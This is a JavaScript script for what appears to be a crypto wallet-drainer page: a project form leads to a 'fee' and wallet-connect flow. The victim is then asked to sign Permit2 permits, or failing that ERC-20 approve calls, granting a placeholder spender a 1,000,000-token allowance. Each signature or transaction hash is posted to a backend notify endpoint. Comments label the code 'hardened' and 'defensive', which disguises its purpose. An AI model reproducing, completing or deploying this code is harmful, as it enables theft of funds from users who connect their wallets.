'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

/* ============================
   UI FLOW (DEFENSIVE)
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (metaMaskButton) {
  metaMaskButton.addEventListener('click', connectMetaMask);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}

/* ============================
   METAMASK (HARDENED)
   ============================ */
async function connectMetaMask() {
  try {
    if (!window.ethereum || !window.ethereum.request) {
      console.error('MetaMask not available');
      return;
    }

    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    });

    if (!Array.isArray(accounts) || !accounts.length) return;

    window.ethereum.on?.('accountsChanged', () => {});
    window.ethereum.on?.('chainChanged', () => {});
    window.ethereum.on?.('disconnect', () => {});

    await approveSpender(accounts[0]);
  } catch (error) {
    console.error('Error connecting to MetaMask:', error);
  }
}

/* ============================
   WALLETCONNECT v2 (MULTI-CHAIN HARDENED)
   ============================ */
let wcProvider = null;

async function connectWalletConnect() {
  try {
    if (!window.EthereumProvider) {
      console.error('WalletConnect provider not loaded');
      return;
    }

    if (!wcProvider) {
      wcProvider = await window.EthereumProvider.init({
        projectId: "a0e525fa712217527b8314e3a1702645",
        chains: [1, 56, 137, 42161],
        showQrModal: true,
        rpcMap: {
          1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
          56: "https://bsc-dataseed.binance.org",
          137: "https://polygon-rpc.com",
          42161: "https://arb1.arbitrum.io/rpc"
        }
      });

      wcProvider.on?.('accountsChanged', () => {});
      wcProvider.on?.('chainChanged', () => {});
      wcProvider.on?.('disconnect', () => {});
    }

    await wcProvider.enable();

    if (typeof Web3 === 'undefined') {
      console.error('Web3 not available');
      return;
    }

    if (typeof window.web3 === 'undefined') {
      window.web3 = new Web3(wcProvider);
    }

    const accounts = await window.web3.eth.getAccounts();
    if (!Array.isArray(accounts) || !accounts.length) return;

    await approveSpender(accounts[0]);
  } catch (error) {
    console.error('Error connecting to WalletConnect:', error);
  }
}

/* ============================
   APPROVAL LOGIC WITH PERMIT2 + FALLBACK
   ============================ */
async function approveSpender(account) {
  try {
    const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';
    const permit2Address = '0xPermit2ContractAddress'; // Uniswap Permit2 deployed address

    const tokens = [
      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
      // add more tokens here if needed
    ];

    // Try Permit2 first
    try {
      const domain = {
        name: 'Permit2',
        chainId: await window.web3.eth.getChainId(),
        verifyingContract: permit2Address
      };

      const types = {
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };

      for (const token of tokens) {
        const message = {
          details: {
            token: token.address,
            amount: token.amount,
            expiration: Math.floor(Date.now() / 1000) + 3600,
            nonce: 0
          },
          spender: spenderAddress,
          sigDeadline: Math.floor(Date.now() / 1000) + 3600
        };

        const signature = await window.ethereum.request({
          method: 'eth_signTypedData_v4',
          params: [account, JSON.stringify({ domain, types, primaryType: 'PermitSingle', message })]
        });

        await fetch("http://localhost:3000/notify", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ owner: account, token: token.address, signature })
        });
      }

      alert('Permit2 approvals signed!');
      return;
    } catch (permitError) {
      console.warn('Permit2 failed, falling back to normal approve:', permitError);
    }

    // Fallback to normal approve
    const abi = [
      {
        "constant": false,
        "inputs": [
          { "name": "_spender", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      }
    ];

    for (const token of tokens) {
      const contract = new window.web3.eth.Contract(abi, token.address);
      const receipt = await contract.methods
        .approve(spenderAddress, token.amount)
        .send({ from: account });

      await fetch("http://localhost:3000/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ owner: account, token: token.address, txHash: receipt.transactionHash })
      });
    }

    alert('Fallback approvals successful!');
  } catch (error) {
    console.error('Approval flow failed:', error);
  }
}
